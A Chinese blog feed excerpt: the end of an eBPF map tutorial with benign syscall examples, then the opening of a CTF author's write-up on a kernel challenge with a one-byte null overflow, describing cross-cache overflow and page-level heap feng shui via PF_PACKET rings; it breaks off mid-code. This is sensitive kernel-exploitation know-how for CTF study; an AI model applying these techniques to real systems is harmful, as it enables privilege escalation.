则返回 <code>-ENOENT</code></td></tr></tbody></table><p>在创建新映射时若 map 中映射数量已经达到 <code>max_entries</code> 则会返回 <code>E2BIG</code></p><h3 id="在-eBPF-map-中查找"><a href="#在-eBPF-map-中查找" class="headerlink" title="在 eBPF map 中查找"></a>在 eBPF map 中查找</h3><p>我们可以通过 <code>BPF_MAP_LOOKUP_ELEM</code> 命令查找 map 中是否存在对应的 key，若是则内核会将 value 拷贝到用户空间指定的 value 缓冲区：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_lookup_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *key, <span class="hljs-type">void</span> *value)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>        .value = (<span class="hljs-type">uint64_t</span>) value,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="遍历-eBPF-map"><a href="#遍历-eBPF-map" class="headerlink" title="遍历 eBPF map"></a>遍历 eBPF map</h3><p><code>BPF_MAP_GET_NEXT_KEY</code> 是一个非常有意思的命令，其会在 map 中查找我们所传入的 key，并将该 key 的下一个 key 拷贝回用户空间，若不存在该 key 则会返回 0 并拷贝 map 中第一个 key 到用户空间，若该 key 为最后一个 key 则返回 <code>-1</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_get_next_key</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *key, <span class="hljs-type">void</span> *value)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>        .next_key = (<span class="hljs-type">uint64_t</span>) value,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, &amp;attr);<br>&#125;<br></code></pre></td></tr></table></figure><p>利用这个命令我们可以很方便地遍历一个 eBPF map：先传入一个不存在的 key 获取到 map 中的第一个 key，接下来再不断 <code>BPF_MAP_GET_NEXT_KEY</code> 直到返回 <code>-1</code> 即可</p><h3 id="删除-eBPF-map-数据"><a href="#删除-eBPF-map-数据" class="headerlink" title="删除 eBPF map 数据"></a>删除 eBPF map 数据</h3><p>我们可以通过 <code>BPF_MAP_DELETE_ELEM</code> 命令删除 map 中已有的映射，若不存在则会返回 <code>-EPERM</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_delete_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *key)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_DELETE_ELEM, &amp;attr);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="销毁-eBPF-map"><a href="#销毁-eBPF-map" class="headerlink" title="销毁 eBPF map"></a>销毁 eBPF map</h3><p>在内核的 eBPF map 数据结构中会保存引用了该 map 的程序数量，若该 map 不再被任一程序引用则会自动释放，因此我们并不需要主动去销毁一个 eBPF map：）</p><h3 id="一个🌰程序"><a href="#一个🌰程序" class="headerlink" title="一个🌰程序"></a><em>一个🌰程序</em></h3><p>下面是使用 eBPF map 的一个示🌰程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;net/if.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/if_packet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/if_ether.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/bpf.h&gt;</span></span><br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span> <span class="hljs-title function_">bpf</span><span class="hljs-params">(<span class="hljs-type">int</span> cmd, <span class="hljs-keyword">union</span> bpf_attr *attr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_bpf, cmd, attr, <span class="hljs-keyword">sizeof</span>(*attr));<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_create</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> map_type, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> key_size, </span><br><span class="hljs-params">               <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> value_size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_entries)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_type = map_type,<br>        .key_size = key_size,<br>        .value_size = value_size,<br>        .max_entries = max_entries,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_CREATE, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_lookup_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *key, <span class="hljs-type">void</span> *value)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>        .value = (<span class="hljs-type">uint64_t</span>) value,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_update_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd,<span class="hljs-type">const</span> <span class="hljs-type">void</span> *key,<span class="hljs-type">const</span> <span class="hljs-type">void</span> *value,<span class="hljs-type">uint64_t</span> flags)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>        .value = (<span class="hljs-type">uint64_t</span>) value,<br>        .flags = flags,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_delete_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *key)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_DELETE_ELEM, &amp;attr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">char</span> orig_value[<span class="hljs-number">0x100</span>] = <span class="hljs-string">&quot;1145141919810&quot;</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">char</span> value[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> map_fd;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Creating new eBPF map...&quot;</span>);<br>    map_fd = bpf_map_create(BPF_MAP_TYPE_HASH, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x100</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">if</span> (map_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to create eBPF map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Adding new map of key-&gt;value...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, <span class="hljs-string">&quot;arttnba3&quot;</span>, orig_value, BPF_ANY) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to update eBPF map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Looking up element in map...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (bpf_map_lookup_elem(map_fd, <span class="hljs-string">&quot;arttnba3&quot;</span>, value) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up elem in eBPF map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get the elem of key %s: %s\n&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, value);<br><br>    close(map_fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行效果如下：</p><p><img src="https://s2.loli.net/2023/05/31/C3vdouj5VryPMws.png" alt="image.png"></p><p>运行在内核中的 eBPF 程序也可以通过 eBPF map 的 fd 访问一个 eBPF map，下面是一个示🌰程序：</p><blockquote><p>注：这里笔者将常用函数 &amp; 指令封装在了 <a href="/download/bpf_tools.h">bpf_tools.h</a> 中</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><br></code></pre></td></tr></table></figure><h1 id="0xFF-REFERENCE"><a href="#0xFF-REFERENCE" class="headerlink" title="0xFF.REFERENCE"></a>0xFF.REFERENCE</h1><p><a href="https://arthurchiao.art/blog/linux-socket-filtering-aka-bpf-zh/">[译] Linux Socket Filtering (LSF, aka BPF)（KernelDoc，2021）</a></p><p><a href="https://heapdump.cn/article/5420563">HeapDump - eBPF指令集规范v1.0</a></p><p><a href="https://www.anquanke.com/post/id/263803">BPF之路一bpf系统调用</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;BEE BEE I’M A SHEEP&lt;/p&gt;</summary>
    
    
    
    <category term="EBPF" scheme="https://arttnba3.github.io/categories/EBPF/"/>
    
    
    <category term="eBPF" scheme="https://arttnba3.github.io/tags/eBPF/"/>
    
    <category term="Linux kernel" scheme="https://arttnba3.github.io/tags/Linux-kernel/"/>
    
  </entry>
  
  <entry>
    <title>【CTF.0x08】D^ 3CTF2023 d3kcache 出题手记</title>
    <link href="https://arttnba3.github.io/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/"/>
    <id>https://arttnba3.github.io/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/</id>
    <published>2023-05-01T17:13:27.000Z</published>
    <updated>2023-09-07T07:55:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>「さらば、全てのリヌクス カーネル エクスプロイテーション。」</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><blockquote><p>都是废话，可以不用看（笑）</p></blockquote><p>不出意外的话这应该是笔者本科阶段最后一次出 D3CTF 的题目了，虽然说笔者一直想整一些好活，但是鉴于笔者实在是太菜了所以一直没能出过特别优秀的题目：）</p><!--相信有不少人（当然，笔者的烂题应该不会有多少人愿意做:-D ）应当已经注意到题目的 banner 是 neta 自新世纪福音战士剧场版的海报----笔者需要为自己过去失败的这一年多时间画上一个不完美的句号，而这道题便是笔者向曾经那个被困于 Linux kernel 的小朋友所作的最终道别：）--><p>笔者一直在想，作为一名黑客，在剥离去各种不同的题目结构、漏洞环境的背后，<strong>我们究竟能在多么极端的情况下完成对一个漏洞的利用？我们是否能够脱离实验室的理想环境实现一种足以应用在实战中的通解？</strong></p><p>Google 在 CVE-2021-22555 当中向我们展示了一个普通的堆上 2 字节溢出如何变成堆溢出&amp; UAF 通杀解法，<a href="https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html">BitsByWill</a> 在 corCTF 2022 中向我们展示了利用页级内核堆风水打破不同 caches 间的阻隔，<a href="https://syst3mfailure.io/">D3v17</a> 则仅利用一个 <code>&#39;\0&#39;</code> 字节的堆溢出便完成了内核提权，<a href="https://kylebot.net/">Kylebot</a> 更是将这一个 <code>&#39;\0&#39;</code> 字节的堆溢出转成了 cross-cache overflow 完成利用，那么再更进一步呢——</p><ul><li>如果漏洞所在结构体大小不够合适&#x2F;结构体自身无法帮助我们完成利用，我们只能借助 <code>msg_msg</code> 等结构体去适配大小，但这类结构体较为稀有且存在诸多限制（例如往往带有一个 header）</li><li>如果漏洞存在于一个独立的 <code>kmem_cache</code> 当中，我们无法借助其他的内核结构体完成利用，只能考虑转化为 cross-cache overflow</li><li>如果漏洞仅有 1 字节的溢出，我们无法利用页级堆风水转成利用 Google 的通杀 exp ，又或是禁用了 System V 消息队列无法利用多级 <code>msg_msg</code>  构造 UAF，我们便只能考虑其他的方案</li><li>如果系统内存较小， 或是 <code>modprobe_path</code> 为静态值，Kylebot 的 unlink attack 将无法发挥作用，我们只好考虑 D3v17 的 <code>poll_list</code> 任意释放</li><li>如果漏洞所在结构体大小不够合适，我们只能进行更加细粒度的页级堆风水，<strong>而不同 order 间的风水会使得成功率大打折扣</strong></li><li><strong>如果内核开启了 Control Flow Integrity，又或者我们甚至都不知道内核镜像信息，那么传统的 ROP 方法基本宣告死亡</strong></li></ul><p><strong>在这样极端的情况下，我们是否还仍能够找到一种通法来完成对内核漏洞的利用？</strong>——这便是笔者在出这道题时最初的想法：）</p><!--此外，笔者认为，**若我们真的找到了这样的一种通法，那么此后的基于内存破坏的 Linux kernel exploitation 便真正算是宣告走到了尽头，此后所有的此类漏洞或是题目不过都是换一种形式过家家罢了：）**----这也是为什么笔者要用 《eva：终》 的那句话来作为这道题目的标语。--><h1 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01.题目分析"></a>0x01.题目分析</h1><p>题目逆向起来应该还是比较简单的，在模块初始化函数中创建了一个独立的 <code>kmem_cache</code> ，对象大小为 2048：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_SIZE 2048</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">d3kcache_module_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    kcache_jar = kmem_cache_create_usercopy(<span class="hljs-string">&quot;kcache_jar&quot;</span>, KCACHE_SIZE, <span class="hljs-number">0</span>, <br>                         SLAB_HWCACHE_ALIGN | SLAB_PANIC | SLAB_ACCOUNT, <br>                         <span class="hljs-number">0</span>, KCACHE_SIZE, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-built_in">memset</span>(kcache_list, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(kcache_list));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>自定义的 ioctl 函数提供了分配、追加编辑、释放、读取的一个堆菜单，漏洞便出在追加编辑当中，当写满 2048 字节时存在着一个 <code>\0</code> 字节的溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">d3kcache_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *__file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> param)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    <span class="hljs-keyword">switch</span> (cmd) &#123;<br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-keyword">case</span> KCACHE_APPEND:<br>            <span class="hljs-keyword">if</span> (usr_cmd.idx &lt; <span class="hljs-number">0</span> || usr_cmd.idx &gt;= KCACHE_NUM <br>                || !kcache_list[usr_cmd.idx].buf) &#123;<br>                printk(KERN_ALERT <span class="hljs-string">&quot;[d3kcache:] Invalid index to write.&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (usr_cmd.sz &gt; KCACHE_SIZE || <br>                (usr_cmd.sz + kcache_list[usr_cmd.idx].size) &gt;= KCACHE_SIZE) &#123;<br>                size = KCACHE_SIZE - kcache_list[usr_cmd.idx].size;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                size = usr_cmd.sz;<br>            &#125;<br><br>            kcache_buf = kcache_list[usr_cmd.idx].buf;<br>            kcache_buf += kcache_list[usr_cmd.idx].size;<br><br>            <span class="hljs-keyword">if</span> (copy_from_user(kcache_buf, usr_cmd.buf, size)) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            kcache_buf[size] = <span class="hljs-string">&#x27;\0&#x27;</span>; <span class="hljs-comment">/* 漏洞点 */</span><br><br>            retval = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>            <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>同时查看题目所提供的内核编译文件，可以发现<strong>开启了 Control Flow Integrity 保护</strong>：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">CONFIG_CFI_CLANG</span>=y<br></code></pre></td></tr></table></figure><p>其他的各种常规保护（KPTI、KASLR、Hardened Usercopy、…）基本上都是开启的，这里就不阐述了</p><blockquote><p>当然，做内核漏洞利用自然要默认这些保护都开了：）</p></blockquote><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><p>由于题目所在的 <code>kmem_cache</code> 为一个独立的  <code>kmem_cache</code> ，因此我们只能考虑 <strong>cross-cache overflow</strong>：<strong>溢出到其他结构体所在页面上完成利用</strong></p><blockquote><p>毕竟你总不能指望在 freelist 相关保护都开启的情况下 free object 的 next 指针刚好在前 8 字节然后覆写又刚好能把 freelist 劫持到有效可控地址上：）</p></blockquote><h2 id="Step-I-页级堆风水构造稳定跨页溢出布局"><a href="#Step-I-页级堆风水构造稳定跨页溢出布局" class="headerlink" title="Step.I - 页级堆风水构造稳定跨页溢出布局"></a>Step.I - 页级堆风水构造稳定跨页溢出布局</h2><p>为了保证溢出的稳定性，这里笔者使用页级堆风水的方法来构造<strong>预溢出布局</strong></p><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>页级堆风水是一种其实不算新但是其实还是稍微有点新的利用手法，顾名思义，<strong>页级堆风水</strong>即以内存页为粒度的内存排布方式，而内核内存页的排布对我们来说不仅未知且信息量巨大，因此这种利用手法实际上是让我们<strong>手工构造一个新的已知的页级粒度内存页排布</strong></p><p>首先让我们重新审视 slub allocator 向 buddy system 请求页面的过程，当 freelist page 已经耗空且 partial 链表也为空时（或者 <code>kmem_cache</code> 刚刚创建后进行第一次分配时），其会向 buddy system 申请页面：</p><p><img src="https://s2.loli.net/2023/01/19/yPtXiwzVfxWH7lE.png" alt="image.png"></p><p>接下来让我们重新审视 buddy system ，其基本原理就是以 2 的 order 次幂张内存页作为分配粒度，相同 order 间空闲页面构成双向链表，当低阶 order 的页面不够用时便会从高阶 order 取一份连续内存页拆成两半，其中一半挂回当前请求 order 链表，另一半返还给上层调用者；下图为以 order 2 为例的 buddy system 页面分配基本原理：</p><p><img src="https://s2.loli.net/2023/01/19/79biltjNfACIZcP.gif" alt="page.gif"></p><p>我们不难想到的是：从更高阶 order 拆分成的两份低阶 order 的连续内存页<strong>是物理连续的</strong>，由此我们可以：</p><ul><li>向 buddy system 请求两份连续的内存页</li><li>释放其中一份内存页，在 <code>vulnerable kmem_cache</code> 上堆喷，让其取走这份内存页</li><li>释放另一份内存页，在 <code>victim kmem_cache</code> 上堆喷，让其取走这份内存页</li></ul><p><strong>此时我们便有可能溢出到其他的内核结构体上，从而完成 cross-cache overflow</strong></p><h3 id="具体利用"><a href="#具体利用" class="headerlink" title="具体利用"></a>具体利用</h3><p>在内核当中有着很多的可以直接向 buddy system 请求页面的 API，这里笔者选用一个来自于 <a href="https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html">CVE-2017-7308</a> 的方案：</p><p>当我们创建一个 protocol 为 <code>PF_PACKET</code> 的 socket 之后，先调用 <code>setsockopt()</code> 将 <code>PACKET_VERSION</code> 设为  <code>TPACKET_V1 </code>&#x2F; <code>TPACKET_V2</code>，再调用 <code>setsockopt()</code> 提交一个 <code>PACKET_TX_RING</code> ，此时便存在如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">__sys_setsockopt()<br>    sock-&gt;ops-&gt;setsockopt()<br>    packet_setsockopt() <span class="hljs-comment">// case PACKET_TX_RING ↓</span><br>    packet_set_ring()<br>    alloc_pg_vec()<br></code></pre></td></tr></table></figure><p>在 <code>alloc_pg_vec()</code> 中会创建一个 <code>pgv</code> 结构体，用以分配 <code>tp_block_nr</code> 份 2<sup>order</sup> 张内存页，其中 <code>order</code> 由 <code>tp_block_size</code> 决定：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> pgv *<span class="hljs-title function_">alloc_pg_vec</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tpacket_req *req, <span class="hljs-type">int</span> order)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block_nr = req-&gt;tp_block_nr;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv</span> *<span class="hljs-title">pg_vec</span>;</span><br><span class="hljs-type">int</span> i;<br><br>pg_vec = kcalloc(block_nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pgv), GFP_KERNEL | __GFP_NOWARN);<br><span class="hljs-keyword">if</span> (unlikely(!pg_vec))<br><span class="hljs-keyword">goto</span> out;<br><br><span class="hljs-keyword">for</span> (i = <span 